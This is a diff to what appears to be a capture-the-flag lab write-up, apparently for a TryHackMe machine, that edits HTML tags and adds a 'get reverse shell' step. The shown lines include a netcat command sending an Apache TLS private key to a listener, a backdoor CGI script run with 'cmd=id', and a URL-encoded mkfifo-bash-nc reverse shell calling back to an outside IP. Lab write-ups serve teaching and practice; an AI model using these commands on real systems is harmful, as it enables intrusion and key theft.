@@ -132,11 +132,10 @@ jack@ubuntu:/opt$ ls
 capture.pcap  urgent.txt
 
 ---
-<h3>after analysing captured packet found <\h3>
+<h3>after analysing captured packet found </h3>
   
 you need TLS key for decryption 
-jack@ubuntu:/opt$ nc -w 3 10.9.30.202 4444 < ../etc/apache2/certs/apache.key 
-
+jack@ubuntu:/opt$ nc -w 3 10.x.x.x 4444 < ../etc/apache2/certs/apache.key 
 
 GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
 Host: 10.0.2.15:41312
@@ -162,11 +161,17 @@ Content-Type: text/html
 
 
 uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
-<h2> open backdoor port <h2>
+<h2> open backdoor port </h2>
   
 jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
 jack@ubuntu:/opt$ ss -tlnup | grep "41312"
 tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        
+
+<h2>get reverse shell </h2>
+
+https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.9.30.202%204444%20%3E%2Ftmp%2Ff
+
+
 
 
 </code>
